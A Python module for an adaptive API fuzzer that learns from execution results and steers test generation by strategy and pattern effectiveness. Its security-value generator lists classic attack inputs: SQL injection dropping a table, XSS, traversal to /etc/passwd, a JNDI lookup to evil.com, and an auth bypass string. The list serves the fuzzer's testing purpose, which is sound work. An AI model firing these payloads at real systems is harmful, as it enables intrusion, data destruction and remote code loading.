"""Adaptive test case generation that learns from previous results."""

import json
import random
import statistics
from typing import Dict, List, Any, Optional, Tuple, Set
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from collections import defaultdict, deque
from enum import Enum

from src.fuzzer.data_models import (
    TestCase, TestType, APISpec, ExecutionResult, 
    DefectType, DefectSeverity, ValidationResult
)
from src.utils.logger import get_logger


class AdaptationStrategy(Enum):
    """Strategies for adapting test generation."""
    EXPLOIT_SUCCESS = "exploit_success"  # Focus on successful patterns
    EXPLORE_FAILURES = "explore_failures"  # Focus on failure patterns
    BALANCED = "balanced"  # Balance between exploitation and exploration
    COVERAGE_DRIVEN = "coverage_driven"  # Focus on increasing coverage
    DEFECT_DRIVEN = "defect_driven"  # Focus on finding more defects


@dataclass
class GenerationPattern:
    """Pattern learned from test generation results."""
    pattern_id: str
    test_type: TestType
    parameter_patterns: Dict[str, Any]
    success_rate: float
    defect_rate: float
    coverage_contribution: float
    usage_count: int = 0
    last_used: datetime = field(default_factory=datetime.now)
    effectiveness_score: float = 0.0
    
    def update_effectiveness(self, success: bool, found_defects: int, 
                           coverage_increase: float) -> None:
        """Update pattern effectiveness based on results.
        
        Args:
            success: Whether the test case was successful
            found_defects: Number of defects found
            coverage_increase: Coverage increase from this test
        """
        self.usage_count += 1
        self.last_used = datetime.now()
        
        # Update success rate with exponential moving average
        alpha = 0.1  # Learning rate
        if success:
            self.success_rate = (1 - alpha) * self.success_rate + alpha * 1.0
        else:
            self.success_rate = (1 - alpha) * self.success_rate + alpha * 0.0
        
        # Update defect rate
        if found_defects > 0:
            self.defect_rate = (1 - alpha) * self.defect_rate + alpha * 1.0
        else:
            self.defect_rate = (1 - alpha) * self.defect_rate + alpha * 0.0
        
        # Update coverage contribution
        self.coverage_contribution = (1 - alpha) * self.coverage_contribution + alpha * coverage_increase
        
        # Calculate overall effectiveness score
        self.effectiveness_score = (
            0.3 * self.success_rate +
            0.4 * self.defect_rate +
            0.3 * min(self.coverage_contribution / 10.0, 1.0)  # Normalize coverage
        )


@dataclass
class AdaptationMetrics:
    """Metrics for tracking adaptation performance."""
    total_adaptations: int = 0
    successful_adaptations: int = 0
    patterns_learned: int = 0
    patterns_exploited: int = 0
    average_effectiveness: float = 0.0
    adaptation_history: List[Dict[str, Any]] = field(default_factory=list)
    
    def record_adaptation(self, strategy: AdaptationStrategy, 
                         effectiveness: float, patterns_used: int) -> None:
        """Record an adaptation event.
        
        Args:
            strategy: Strategy used for adaptation
            effectiveness: Effectiveness score of the adaptation
            patterns_used: Number of patterns used
        """
        self.total_adaptations += 1
        if effectiveness > 0.5:  # Consider > 0.5 as successful
            self.successful_adaptations += 1
        
        self.patterns_exploited += patterns_used
        
        # Update average effectiveness with exponential moving average
        alpha = 0.1
        self.average_effectiveness = (
            (1 - alpha) * self.average_effectiveness + alpha * effectiveness
        )
        
        # Record in history
        self.adaptation_history.append({
            'timestamp': datetime.now().isoformat(),
            'strategy': strategy.value,
            'effectiveness': effectiveness,
            'patterns_used': patterns_used
        })
        
        # Keep only recent history
        if len(self.adaptation_history) > 1000:
            self.adaptation_history = self.adaptation_history[-500:]


class AdaptiveGenerator:
    """Adaptive test case generator that learns from previous results."""
    
    def __init__(self, learning_rate: float = 0.1, 
                 exploration_rate: float = 0.2,
                 pattern_memory_size: int = 1000):
        """Initialize the adaptive generator.
        
        Args:
            learning_rate: Rate at which to adapt to new information
            exploration_rate: Rate of exploration vs exploitation
            pattern_memory_size: Maximum number of patterns to remember
        """
        self.learning_rate = learning_rate
        self.exploration_rate = exploration_rate
        self.pattern_memory_size = pattern_memory_size
        self.logger = get_logger("AdaptiveGenerator")
        
        # Pattern storage
        self.patterns: Dict[str, GenerationPattern] = {}
        self.pattern_usage_history: deque = deque(maxlen=10000)
        
        # Strategy management
        self.current_strategy = AdaptationStrategy.BALANCED
        self.strategy_performance: Dict[AdaptationStrategy, float] = {
            strategy: 0.5 for strategy in AdaptationStrategy
        }
        
        # Metrics tracking
        self.metrics = AdaptationMetrics()
        
        # Parameter effectiveness tracking
        self.parameter_effectiveness: Dict[str, Dict[str, float]] = defaultdict(lambda: defaultdict(float))
        self.api_effectiveness: Dict[str, float] = defaultdict(float)
        
        # Recent results for learning
        self.recent_results: deque = deque(maxlen=1000)
        
    def learn_from_results(self, test_cases: List[TestCase], 
                          execution_results: List[ExecutionResult]) -> None:
        """Learn from test execution results to improve future generation.
        
        Args:
            test_cases: Test cases that were executed
            execution_results: Results from executing the test cases
        """
        if len(test_cases) != len(execution_results):
            self.logger.warning("Mismatch between test cases and results count")
            return
        
        self.logger.debug(f"Learning from {len(test_cases)} test results")
        
        for test_case, result in zip(test_cases, execution_results):
            self._learn_from_single_result(test_case, result)
        
        # Update strategy performance
        self._update_strategy_performance()
        
        # Adapt strategy if needed
        self._adapt_strategy()
        
        # Clean up old patterns
        self._cleanup_patterns()
        
        self.logger.debug(f"Learning completed. Total patterns: {len(self.patterns)}")
    
    def _learn_from_single_result(self, test_case: TestCase, 
                                 result: ExecutionResult) -> None:
        """Learn from a single test case result.
        
        Args:
            test_case: Test case that was executed
            result: Execution result
        """
        # Record result for recent history
        result_data = {
            'test_case': test_case,
            'result': result,
            'timestamp': datetime.now(),
            'success': result.success,
            'defects_found': len(result.detected_issues),
            'coverage_delta': result.coverage_delta.line_coverage if result.coverage_delta else 0.0
        }
        self.recent_results.append(result_data)
        
        # Extract pattern from test case
        pattern = self._extract_pattern(test_case)
        
        if pattern:
            # Update or create pattern
            if pattern.pattern_id in self.patterns:
                existing_pattern = self.patterns[pattern.pattern_id]
                existing_pattern.update_effectiveness(
                    success=result.success,
                    found_defects=len(result.detected_issues),
                    coverage_increase=result.coverage_delta.line_coverage if result.coverage_delta else 0.0
                )
            else:
                pattern.update_effectiveness(
                    success=result.success,
                    found_defects=len(result.detected_issues),
                    coverage_increase=result.coverage_delta.line_coverage if result.coverage_delta else 0.0
                )
                self.patterns[pattern.pattern_id] = pattern
                self.metrics.patterns_learned += 1
        
        # Update parameter effectiveness
        self._update_parameter_effectiveness(test_case, result)
        
        # Update API effectiveness
        api_effectiveness = 1.0 if result.success else 0.0
        if result.detected_issues:
            api_effectiveness += len(result.detected_issues) * 0.5
        
        self.api_effectiveness[test_case.api_name] = (
            0.9 * self.api_effectiveness[test_case.api_name] + 
            0.1 * api_effectiveness
        )
    
    def _extract_pattern(self, test_case: TestCase) -> Optional[GenerationPattern]:
        """Extract a learnable pattern from a test case.
        
        Args:
            test_case: Test case to extract pattern from
            
        Returns:
            GenerationPattern or None if no pattern can be extracted
        """
        try:
            # Create parameter pattern
            param_patterns = {}
            for param_name, param_value in test_case.parameters.items():
                # Categorize parameter values
                if isinstance(param_value, str):
                    if len(param_value) == 0:
                        param_patterns[param_name] = "empty_string"
                    elif len(param_value) > 1000:
                        param_patterns[param_name] = "long_string"
                    elif any(char in param_value for char in ['<', '>', '&', '"', "'"]):
                        param_patterns[param_name] = "special_chars"
                    elif param_value.isdigit():
                        param_patterns[param_name] = "numeric_string"
                    else:
                        param_patterns[param_name] = "normal_string"
                elif isinstance(param_value, (int, float)):
                    if param_value == 0:
                        param_patterns[param_name] = "zero"
                    elif param_value < 0:
                        param_patterns[param_name] = "negative"
                    elif param_value > 1000000:
                        param_patterns[param_name] = "large_number"
                    else:
                        param_patterns[param_name] = "normal_number"
                elif isinstance(param_value, bool):
                    param_patterns[param_name] = f"boolean_{param_value}"
                elif isinstance(param_value, list):
                    if len(param_value) == 0:
                        param_patterns[param_name] = "empty_array"
                    elif len(param_value) > 100:
                        param_patterns[param_name] = "large_array"
                    else:
                        param_patterns[param_name] = "normal_array"
                elif isinstance(param_value, dict):
                    if len(param_value) == 0:
                        param_patterns[param_name] = "empty_object"
                    else:
                        param_patterns[param_name] = "normal_object"
                else:
                    param_patterns[param_name] = "unknown_type"
            
            # Create pattern ID
            pattern_key = f"{test_case.test_type.value}_{json.dumps(param_patterns, sort_keys=True)}"
            pattern_id = f"pattern_{hash(pattern_key) & 0x7FFFFFFF:08x}"
            
            return GenerationPattern(
                pattern_id=pattern_id,
                test_type=test_case.test_type,
                parameter_patterns=param_patterns,
                success_rate=0.5,  # Initial neutral value
                defect_rate=0.0,
                coverage_contribution=0.0
            )
            
        except Exception as e:
            self.logger.warning(f"Failed to extract pattern from test case: {e}")
            return None
    
    def _update_parameter_effectiveness(self, test_case: TestCase, 
                                      result: ExecutionResult) -> None:
        """Update effectiveness tracking for parameters.
        
        Args:
            test_case: Test case that was executed
            result: Execution result
        """
        effectiveness = 0.0
        if result.success:
            effectiveness += 0.5
        if result.detected_issues:
            effectiveness += len(result.detected_issues) * 0.3
        if result.coverage_delta and result.coverage_delta.line_coverage > 0:
            effectiveness += result.coverage_delta.line_coverage * 0.01
        
        for param_name, param_value in test_case.parameters.items():
            param_key = f"{param_name}_{type(param_value).__name__}"
            current_eff = self.parameter_effectiveness[test_case.api_name][param_key]
            self.parameter_effectiveness[test_case.api_name][param_key] = (
                0.9 * current_eff + 0.1 * effectiveness
            )
    
    def generate_adaptive_test_cases(self, api_spec: APISpec, 
                                   count: int,
                                   strategy: Optional[AdaptationStrategy] = None) -> List[TestCase]:
        """Generate test cases using adaptive learning.
        
        Args:
            api_spec: API specification to generate tests for
            count: Number of test cases to generate
            strategy: Adaptation strategy to use (uses current if None)
            
        Returns:
            List of adaptively generated test cases
        """
        if strategy is None:
            strategy = self.current_strategy
        
        self.logger.debug(f"Generating {count} adaptive test cases for {api_spec.name} "
                         f"using strategy: {strategy.value}")
        
        test_cases = []
        patterns_used = 0
        
        # Determine test type distribution based on strategy
        type_distribution = self._get_type_distribution(strategy, api_spec)
        
        for test_type, type_count in type_distribution.items():
            if type_count == 0:
                continue
            
            # Get relevant patterns for this test type
            relevant_patterns = self._get_relevant_patterns(test_type, api_spec)
            
            for i in range(type_count):
                if random.random() < self.exploration_rate:
                    # Exploration: generate random test case
                    test_case = self._generate_exploratory_test_case(api_spec, test_type, i)
                else:
                    # Exploitation: use learned patterns
                    test_case = self._generate_pattern_based_test_case(
                        api_spec, test_type, relevant_patterns, i
                    )
                    if test_case:
                        patterns_used += 1
                
                if test_case:
                    test_cases.append(test_case)
        
        # Record adaptation metrics
        avg_effectiveness = self._calculate_average_pattern_effectiveness(
            [p for p in self.patterns.values() if p.test_type in type_distribution]
        )
        self.metrics.record_adaptation(strategy, avg_effectiveness, patterns_used)
        
        self.logger.debug(f"Generated {len(test_cases)} adaptive test cases, "
                         f"used {patterns_used} patterns")
        
        return test_cases
    
    def _get_type_distribution(self, strategy: AdaptationStrategy, 
                              api_spec: APISpec) -> Dict[TestType, int]:
        """Get test type distribution based on strategy.
        
        Args:
            strategy: Adaptation strategy
            api_spec: API specification
            
        Returns:
            Dictionary mapping test types to counts
        """
        base_count = 10  # Base number of tests per type
        
        if strategy == AdaptationStrategy.EXPLOIT_SUCCESS:
            # Focus on test types that have been successful
            successful_types = self._get_successful_test_types(api_spec)
            return {test_type: base_count if test_type in successful_types else 2 
                   for test_type in TestType}
        
        elif strategy == AdaptationStrategy.EXPLORE_FAILURES:
            # Focus on test types that have failed (might find more issues)
            failed_types = self._get_failed_test_types(api_spec)
            return {test_type: base_count if test_type in failed_types else 2 
                   for test_type in TestType}
        
        elif strategy == AdaptationStrategy.COVERAGE_DRIVEN:
            # Focus on test types that increase coverage
            coverage_types = self._get_coverage_increasing_types(api_spec)
            return {test_type: base_count if test_type in coverage_types else 3 
                   for test_type in TestType}
        
        elif strategy == AdaptationStrategy.DEFECT_DRIVEN:
            # Focus on test types that find defects
            defect_types = self._get_defect_finding_types(api_spec)
            return {test_type: base_count if test_type in defect_types else 2 
                   for test_type in TestType}
        
        else:  # BALANCED
            return {test_type: base_count // len(TestType) + 2 for test_type in TestType}
    
    def _get_relevant_patterns(self, test_type: TestType, 
                              api_spec: APISpec) -> List[GenerationPattern]:
        """Get patterns relevant to the test type and API.
        
        Args:
            test_type: Type of test case
            api_spec: API specification
            
        Returns:
            List of relevant patterns sorted by effectiveness
        """
        relevant_patterns = []
        
        for pattern in self.patterns.values():
            if pattern.test_type == test_type:
                # Check if pattern is relevant to this API
                relevance_score = self._calculate_pattern_relevance(pattern, api_spec)
                if relevance_score > 0.1:  # Minimum relevance threshold
                    relevant_patterns.append(pattern)
        
        # Sort by effectiveness score
        relevant_patterns.sort(key=lambda p: p.effectiveness_score, reverse=True)
        
        return relevant_patterns[:20]  # Limit to top 20 patterns
    
    def _calculate_pattern_relevance(self, pattern: GenerationPattern, 
                                   api_spec: APISpec) -> float:
        """Calculate how relevant a pattern is to an API spec.
        
        Args:
            pattern: Generation pattern
            api_spec: API specification
            
        Returns:
            Relevance score between 0 and 1
        """
        relevance = 0.0
        
        # Check parameter name overlap
        api_param_names = {param.name for param in api_spec.parameters}
        pattern_param_names = set(pattern.parameter_patterns.keys())
        
        if api_param_names and pattern_param_names:
            overlap = len(api_param_names & pattern_param_names)
            relevance += overlap / len(api_param_names) * 0.6
        
        # Check parameter type compatibility
        type_matches = 0
        total_params = len(api_spec.parameters)
        
        for param in api_spec.parameters:
            if param.name in pattern.parameter_patterns:
                pattern_type = pattern.parameter_patterns[param.name]
                if self._is_type_compatible(param.type, pattern_type):
                    type_matches += 1
        
        if total_params > 0:
            relevance += (type_matches / total_params) * 0.4
        
        return min(relevance, 1.0)
    
    def _is_type_compatible(self, api_param_type: str, pattern_type: str) -> bool:
        """Check if API parameter type is compatible with pattern type.
        
        Args:
            api_param_type: API parameter type
            pattern_type: Pattern parameter type
            
        Returns:
            True if compatible
        """
        compatibility_map = {
            'string': ['empty_string', 'long_string', 'special_chars', 'numeric_string', 'normal_string'],
            'integer': ['zero', 'negative', 'large_number', 'normal_number'],
            'number': ['zero', 'negative', 'large_number', 'normal_number'],
            'boolean': ['boolean_True', 'boolean_False'],
            'array': ['empty_array', 'large_array', 'normal_array'],
            'object': ['empty_object', 'normal_object']
        }
        
        compatible_types = compatibility_map.get(api_param_type, [])
        return pattern_type in compatible_types
    
    def _generate_pattern_based_test_case(self, api_spec: APISpec, 
                                        test_type: TestType,
                                        patterns: List[GenerationPattern],
                                        index: int) -> Optional[TestCase]:
        """Generate test case based on learned patterns.
        
        Args:
            api_spec: API specification
            test_type: Type of test case to generate
            patterns: Relevant patterns to use
            index: Test case index
            
        Returns:
            Generated test case or None if generation failed
        """
        if not patterns:
            return self._generate_exploratory_test_case(api_spec, test_type, index)
        
        # Select pattern based on effectiveness
        pattern = self._select_pattern_probabilistically(patterns)
        
        try:
            parameters = {}
            
            for param in api_spec.parameters:
                if param.name in pattern.parameter_patterns:
                    # Use pattern-based value
                    pattern_type = pattern.parameter_patterns[param.name]
                    param_value = self._generate_value_from_pattern(param, pattern_type)
                else:
                    # Use default value for parameters not in pattern
                    param_value = self._generate_default_value_for_type(param.type)
                
                parameters[param.name] = param_value
            
            test_case = TestCase(
                id=f"{api_spec.name}_{test_type.value}_adaptive_{index+1}",
                api_name=api_spec.name,
                parameters=parameters,
                test_type=test_type,
                expected_result="success" if test_type == TestType.NORMAL else "error",
                generation_prompt=f"Adaptive test case based on pattern {pattern.pattern_id}"
            )
            
            # Record pattern usage
            pattern.usage_count += 1
            pattern.last_used = datetime.now()
            
            return test_case
            
        except Exception as e:
            self.logger.warning(f"Failed to generate pattern-based test case: {e}")
            return self._generate_exploratory_test_case(api_spec, test_type, index)
    
    def _select_pattern_probabilistically(self, patterns: List[GenerationPattern]) -> GenerationPattern:
        """Select a pattern probabilistically based on effectiveness.
        
        Args:
            patterns: List of patterns to choose from
            
        Returns:
            Selected pattern
        """
        if not patterns:
            raise ValueError("No patterns provided")
        
        # Calculate selection probabilities based on effectiveness
        effectiveness_scores = [max(p.effectiveness_score, 0.1) for p in patterns]
        total_score = sum(effectiveness_scores)
        
        if total_score == 0:
            return random.choice(patterns)
        
        # Weighted random selection
        rand_val = random.random() * total_score
        cumulative = 0.0
        
        for pattern, score in zip(patterns, effectiveness_scores):
            cumulative += score
            if rand_val <= cumulative:
                return pattern
        
        return patterns[-1]  # Fallback
    
    def _generate_value_from_pattern(self, param: Any, pattern_type: str) -> Any:
        """Generate parameter value based on pattern type.
        
        Args:
            param: Parameter specification
            pattern_type: Pattern type for the parameter
            
        Returns:
            Generated parameter value
        """
        if pattern_type == "empty_string":
            return ""
        elif pattern_type == "long_string":
            return "A" * random.randint(1000, 10000)
        elif pattern_type == "special_chars":
            special_chars = ['<script>', '&lt;', '&gt;', '"', "'", '&amp;']
            return random.choice(special_chars)
        elif pattern_type == "numeric_string":
            return str(random.randint(1, 999999))
        elif pattern_type == "normal_string":
            return f"test_value_{random.randint(1, 1000)}"
        elif pattern_type == "zero":
            return 0
        elif pattern_type == "negative":
            return random.randint(-1000, -1)
        elif pattern_type == "large_number":
            return random.randint(1000000, 999999999)
        elif pattern_type == "normal_number":
            return random.randint(1, 1000)
        elif pattern_type == "boolean_True":
            return True
        elif pattern_type == "boolean_False":
            return False
        elif pattern_type == "empty_array":
            return []
        elif pattern_type == "large_array":
            return [f"item_{i}" for i in range(random.randint(100, 1000))]
        elif pattern_type == "normal_array":
            return [f"item_{i}" for i in range(random.randint(1, 10))]
        elif pattern_type == "empty_object":
            return {}
        elif pattern_type == "normal_object":
            return {"key": "value", "number": random.randint(1, 100)}
        else:
            return self._generate_default_value_for_type(getattr(param, 'type', 'string'))
    
    def _generate_default_value_for_type(self, param_type: str) -> Any:
        """Generate default value for parameter type.
        
        Args:
            param_type: Parameter type
            
        Returns:
            Default value for the type
        """
        defaults = {
            'string': 'default_value',
            'integer': 42,
            'number': 3.14,
            'boolean': True,
            'array': ['item1', 'item2'],
            'object': {'key': 'value'}
        }
        return defaults.get(param_type, 'unknown')
    
    def _generate_exploratory_test_case(self, api_spec: APISpec, 
                                      test_type: TestType, 
                                      index: int) -> TestCase:
        """Generate exploratory test case for learning new patterns.
        
        Args:
            api_spec: API specification
            test_type: Type of test case
            index: Test case index
            
        Returns:
            Generated exploratory test case
        """
        parameters = {}
        
        for param in api_spec.parameters:
            # Generate random values based on test type
            if test_type == TestType.EDGE:
                param_value = self._generate_edge_value(param)
            elif test_type == TestType.SECURITY:
                param_value = self._generate_security_value(param)
            elif test_type == TestType.MALFORMED:
                param_value = self._generate_malformed_value(param)
            else:  # NORMAL
                param_value = self._generate_normal_value(param)
            
            parameters[param.name] = param_value
        
        return TestCase(
            id=f"{api_spec.name}_{test_type.value}_exploratory_{index+1}",
            api_name=api_spec.name,
            parameters=parameters,
            test_type=test_type,
            expected_result="success" if test_type == TestType.NORMAL else "error",
            generation_prompt=f"Exploratory {test_type.value} test case"
        )
    
    def _generate_edge_value(self, param: Any) -> Any:
        """Generate edge case value for parameter."""
        param_type = getattr(param, 'type', 'string')
        
        if param_type == 'string':
            return random.choice(['', ' ', 'A' * 1000, '\n\r\t', '🚀'])
        elif param_type in ['integer', 'number']:
            return random.choice([0, -1, 999999999, -999999999])
        elif param_type == 'boolean':
            return random.choice([True, False])
        elif param_type == 'array':
            return random.choice([[], ['item'] * 1000])
        elif param_type == 'object':
            return random.choice([{}, {f'key_{i}': i for i in range(1000)}])
        else:
            return None
    
    def _generate_security_value(self, param: Any) -> Any:
        """Generate security test value for parameter."""
        param_type = getattr(param, 'type', 'string')
        
        if param_type == 'string':
            security_payloads = [
                "'; DROP TABLE users; --",
                "<script>alert('xss')</script>",
                "../../../etc/passwd",
                "${jndi:ldap://evil.com/a}",
                "admin' OR '1'='1"
            ]
            return random.choice(security_payloads)
        else:
            return self._generate_default_value_for_type(param_type)
    
    def _generate_malformed_value(self, param: Any) -> Any:
        """Generate malformed value for parameter."""
        param_type = getattr(param, 'type', 'string')
        
        # Return wrong type for parameter
        if param_type == 'string':
            return random.choice([123, True, [], {}])
        elif param_type in ['integer', 'number']:
            return random.choice(['not_a_number', True, []])
        elif param_type == 'boolean':
            return random.choice(['maybe', 123, []])
        elif param_type == 'array':
            return random.choice(['not_array', 123, True])
        elif param_type == 'object':
            return random.choice(['not_object', 123, []])
        else:
            return None
    
    def _generate_normal_value(self, param: Any) -> Any:
        """Generate normal value for parameter."""
        return self._generate_default_value_for_type(getattr(param, 'type', 'string'))
    
    def _get_successful_test_types(self, api_spec: APISpec) -> Set[TestType]:
        """Get test types that have been successful for this API."""
        successful_types = set()
        
        for result_data in self.recent_results:
            if (result_data['test_case'].api_name == api_spec.name and 
                result_data['success']):
                successful_types.add(result_data['test_case'].test_type)
        
        return successful_types or {TestType.NORMAL}  # Default fallback
    
    def _get_failed_test_types(self, api_spec: APISpec) -> Set[TestType]:
        """Get test types that have failed for this API."""
        failed_types = set()
        
        for result_data in self.recent_results:
            if (result_data['test_case'].api_name == api_spec.name and 
                not result_data['success']):
                failed_types.add(result_data['test_case'].test_type)
        
        return failed_types or {TestType.SECURITY}  # Default fallback
    
    def _get_coverage_increasing_types(self, api_spec: APISpec) -> Set[TestType]:
        """Get test types that increase coverage for this API."""
        coverage_types = set()
        
        for result_data in self.recent_results:
            if (result_data['test_case'].api_name == api_spec.name and 
                result_data['coverage_delta'] > 0):
                coverage_types.add(result_data['test_case'].test_type)
        
        return coverage_types or {TestType.EDGE}  # Default fallback
    
    def _get_defect_finding_types(self, api_spec: APISpec) -> Set[TestType]:
        """Get test types that find defects for this API."""
        defect_types = set()
        
        for result_data in self.recent_results:
            if (result_data['test_case'].api_name == api_spec.name and 
                result_data['defects_found'] > 0):
                defect_types.add(result_data['test_case'].test_type)
        
        return defect_types or {TestType.SECURITY}  # Default fallback
    
    def _calculate_average_pattern_effectiveness(self, patterns: List[GenerationPattern]) -> float:
        """Calculate average effectiveness of patterns."""
        if not patterns:
            return 0.0
        
        return sum(p.effectiveness_score for p in patterns) / len(patterns)
    
    def _update_strategy_performance(self) -> None:
        """Update performance tracking for different strategies."""
        if len(self.recent_results) < 10:
            return  # Need minimum results for meaningful analysis
        
        # Analyze recent results to update strategy performance
        recent_effectiveness = []
        for result_data in list(self.recent_results)[-50:]:  # Last 50 results
            effectiveness = 0.0
            if result_data['success']:
                effectiveness += 0.5
            effectiveness += result_data['defects_found'] * 0.3
            effectiveness += result_data['coverage_delta'] * 0.01
            recent_effectiveness.append(effectiveness)
        
        if recent_effectiveness:
            avg_effectiveness = statistics.mean(recent_effectiveness)
            
            # Update current strategy performance
            current_perf = self.strategy_performance[self.current_strategy]
            self.strategy_performance[self.current_strategy] = (
                0.9 * current_perf + 0.1 * avg_effectiveness
            )
    
    def _adapt_strategy(self) -> None:
        """Adapt the current strategy based on performance."""
        # Only adapt if we have enough data
        if self.metrics.total_adaptations < 5:
            return
        
        # Find best performing strategy
        best_strategy = max(self.strategy_performance.items(), key=lambda x: x[1])
        
        # Switch to best strategy if significantly better
        if (best_strategy[1] > self.strategy_performance[self.current_strategy] + 0.1 and
            best_strategy[0] != self.current_strategy):
            
            old_strategy = self.current_strategy
            self.current_strategy = best_strategy[0]
            
            self.logger.info(f"Adapted strategy from {old_strategy.value} to "
                           f"{self.current_strategy.value} "
                           f"(performance: {best_strategy[1]:.3f})")
    
    def _cleanup_patterns(self) -> None:
        """Clean up old or ineffective patterns."""
        if len(self.patterns) <= self.pattern_memory_size:
            return
        
        # Sort patterns by effectiveness and recency
        pattern_items = list(self.patterns.items())
        pattern_items.sort(key=lambda x: (
            x[1].effectiveness_score,
            x[1].last_used.timestamp()
        ))
        
        # Remove least effective patterns
        patterns_to_remove = len(self.patterns) - self.pattern_memory_size
        for i in range(patterns_to_remove):
            pattern_id = pattern_items[i][0]
            del self.patterns[pattern_id]
        
        self.logger.debug(f"Cleaned up {patterns_to_remove} patterns")
    
    def get_adaptation_statistics(self) -> Dict[str, Any]:
        """Get comprehensive adaptation statistics.
        
        Returns:
            Dictionary with adaptation statistics
        """
        return {
            'metrics': {
                'total_adaptations': self.metrics.total_adaptations,
                'successful_adaptations': self.metrics.successful_adaptations,
                'patterns_learned': self.metrics.patterns_learned,
                'patterns_exploited': self.metrics.patterns_exploited,
                'average_effectiveness': self.metrics.average_effectiveness,
                'success_rate': (self.metrics.successful_adaptations / 
                               max(1, self.metrics.total_adaptations))
            },
            'current_strategy': self.current_strategy.value,
            'strategy_performance': {
                strategy.value: performance 
                for strategy, performance in self.strategy_performance.items()
            },
            'pattern_statistics': {
                'total_patterns': len(self.patterns),
                'avg_effectiveness': self._calculate_average_pattern_effectiveness(
                    list(self.patterns.values())
                ),
                'most_effective_pattern': max(
                    self.patterns.values(), 
                    key=lambda p: p.effectiveness_score,
                    default=None
                ).pattern_id if self.patterns else None
            },
            'learning_parameters': {
                'learning_rate': self.learning_rate,
                'exploration_rate': self.exploration_rate,
                'pattern_memory_size': self.pattern_memory_size
            }
        }
    
    def export_learned_patterns(self) -> Dict[str, Any]:
        """Export learned patterns for analysis or transfer.
        
        Returns:
            Dictionary with all learned patterns
        """
        exported_patterns = {}
        
        for pattern_id, pattern in self.patterns.items():
            exported_patterns[pattern_id] = {
                'test_type': pattern.test_type.value,
                'parameter_patterns': pattern.parameter_patterns,
                'success_rate': pattern.success_rate,
                'defect_rate': pattern.defect_rate,
                'coverage_contribution': pattern.coverage_contribution,
                'usage_count': pattern.usage_count,
                'last_used': pattern.last_used.isoformat(),
                'effectiveness_score': pattern.effectiveness_score
            }
        
        return {
            'patterns': exported_patterns,
            'export_timestamp': datetime.now().isoformat(),
            'total_patterns': len(exported_patterns)
        }
    
    def import_learned_patterns(self, pattern_data: Dict[str, Any]) -> int:
        """Import previously learned patterns.
        
        Args:
            pattern_data: Pattern data from export_learned_patterns()
            
        Returns:
            Number of patterns imported
        """
        imported_count = 0
        
        try:
            patterns_dict = pattern_data.get('patterns', {})
            
            for pattern_id, pattern_info in patterns_dict.items():
                pattern = GenerationPattern(
                    pattern_id=pattern_id,
                    test_type=TestType(pattern_info['test_type']),
                    parameter_patterns=pattern_info['parameter_patterns'],
                    success_rate=pattern_info['success_rate'],
                    defect_rate=pattern_info['defect_rate'],
                    coverage_contribution=pattern_info['coverage_contribution'],
                    usage_count=pattern_info['usage_count'],
                    last_used=datetime.fromisoformat(pattern_info['last_used']),
                    effectiveness_score=pattern_info['effectiveness_score']
                )
                
                self.patterns[pattern_id] = pattern
                imported_count += 1
            
            self.logger.info(f"Imported {imported_count} learned patterns")
            
        except Exception as e:
            self.logger.error(f"Failed to import patterns: {e}")
        
        return imported_count